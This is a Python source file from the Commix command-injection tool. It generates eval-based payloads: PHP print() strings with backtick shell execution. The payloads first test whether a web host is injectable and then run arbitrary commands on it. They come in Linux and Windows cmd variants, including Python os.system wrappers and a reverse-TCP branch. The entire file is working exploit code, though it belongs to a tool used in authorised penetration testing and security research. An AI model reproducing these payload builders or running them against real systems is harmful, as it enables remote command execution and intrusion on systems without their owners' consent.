#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
The dynamic code evaluation (aka eval-based) technique.
The available "eval-based" payloads.
"""

"""
eval-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.SKIP_CALC:
      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)" +
                    separator
                  )
      else:
        payload = ("print(`echo " + TAG +
                    separator + "echo " + TAG +
                    separator + "echo " + TAG + "`)%3B"
                  )
    else:
      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "`for /f \"tokens=*\" %i in ('cmd /c \"" +
                    "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
                    "\"') do @set /p = %i " + settings.CMD_NUL + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)" +
                    separator
                  )
      else:
        payload = ("print(`echo " + TAG +
                    separator + "for /f \"tokens=*\" %i in ('cmd /c \"" +
                    "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
                    "\"') do @set /p = %i " + settings.CMD_NUL +
                    separator + "echo " + TAG +
                    separator + "echo " + TAG + "`)%3B"
                  )

  else:
    if settings.SKIP_CALC:
      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)" +
                    separator
                  )
      else:
        payload = ("print(`echo " + TAG +
                    separator + "echo " + TAG +
                    separator + "echo " + TAG + "`)%3B"
                  )
    else:
      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)" +
                    separator
                  )
      else:
        payload = ("print(`echo " + TAG +
                    separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" +
                    separator + "echo " + TAG +
                    separator + "echo " + TAG + "`)%3B"
                  )

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + ")))\""
    if settings.SKIP_CALC:
      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)" +
                    separator
                  )
      else:
        payload = ("print(`echo " + TAG +
                    separator + "echo " + TAG +
                    separator + "echo " + TAG + "`)%3B"
                  )
    else:
      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "` cmd /c " + python_payload + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)" +
                    separator
                  )
      else:
        payload = ("print(`echo " + TAG +
                    separator +python_payload +
                    separator + "echo " + TAG +
                    separator + "echo " + TAG + "`)%3B"
                  )

  else:
    python_payload = settings.LINUX_PYTHON_INTERPRETER + " -c \"print(str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + ")))\""
    if settings.SKIP_CALC:
      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)" +
                    separator
                  )
      else:
        payload = ("print(`echo " + TAG +
                    separator + "echo " + TAG +
                    separator + "echo " + TAG + "`)%3B"
                  )
    else:
      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "` " + python_payload + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)" +
                    separator
                  )
      else:
        payload = ("print(`echo " + TAG +
                    separator +python_payload  +
                    separator + "echo " + TAG +
                    separator + "echo " + TAG + "`)%3B"
                  )

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = ( "for /f \"tokens=*\" %i in ('cmd /c " +
            cmd +
            "') do @set /p = %i " + settings.CMD_NUL
          )
    if separator == "":
      payload = ("print(`echo " + TAG + "`." +
                  "`echo " + TAG + "`." +
                  "`" + cmd + "`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)"
                )

    else:
      payload = ("print(`echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'" +
                  separator + cmd +
                  separator + "echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'`)%3B"
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    if separator == "":
      payload = ("print(`echo " + TAG + "`." +
                  "`echo " + TAG + "`." +
                  "`" + cmd + "`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)"
                )
    else:
      payload = ("print(`echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'" +
                  separator + cmd  +
                  separator + "echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'`)%3B"
                )

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.REVERSE_TCP:
      payload = (separator + cmd + settings.SINGLE_WHITESPACE
                )
    else:
      python_payload = ("for /f \"tokens=*\" %i in ('cmd /c " +
                        settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + "')\"" +
                        "') do @set /p = %i " + settings.CMD_NUL
                       )

      if separator == "":
        payload = ("print(`echo " + TAG + "`." +
                    "`echo " + TAG + "`." +
                    "`" + python_payload + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)"
                  )
      else:
        payload = ("print(`echo '" + TAG + "'" +
                    separator + "echo '" + TAG + "'" +
                    separator + python_payload +
                    separator + "echo '" + TAG + "'" +
                    separator + "echo '" + TAG + "'`)%3B"
                  )
  else:
    settings.USER_APPLIED_CMD = cmd
    if separator == "":
      payload = ("print(`echo " + TAG + "`." +
                  "`echo " + TAG + "`." +
                  "`" + cmd + "`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)"
                )
    else:
      payload = ("print(`echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'" +
                  separator +cmd  +
                  separator + "echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'`)%3B"
                )
  return payload

# eof